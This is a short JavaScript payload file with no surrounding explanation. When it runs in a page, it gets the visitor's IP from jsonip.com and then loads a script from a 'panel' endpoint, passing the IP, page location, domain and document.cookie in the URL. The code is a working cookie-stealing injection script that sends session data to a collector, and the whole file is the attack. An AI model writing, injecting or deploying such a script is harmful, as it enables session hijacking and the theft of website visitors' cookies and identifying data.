
function payload()
{
	x = document.getElementById("poisonpayload");
	
	if (x == null)
	{
		
		document.write("<script>function getip(json){ document.write('<script type=\\\"application/javascript\\\" src=\\\"http://localhost/panel/poisonpayload.php?id=\'+ json.ip + \'&location=\'+ document.location + \'&domain=\'+ document.domain + \'&cookie=\'+ document.cookie + \'\\\"></scr\'+\'ipt>'); }; </script>");
		document.write("<script id='poisonpayload' type='application/javascript' src='https://jsonip.com/?callback=getip'></script>");
	};

	
	
	
	
	}	

payload();
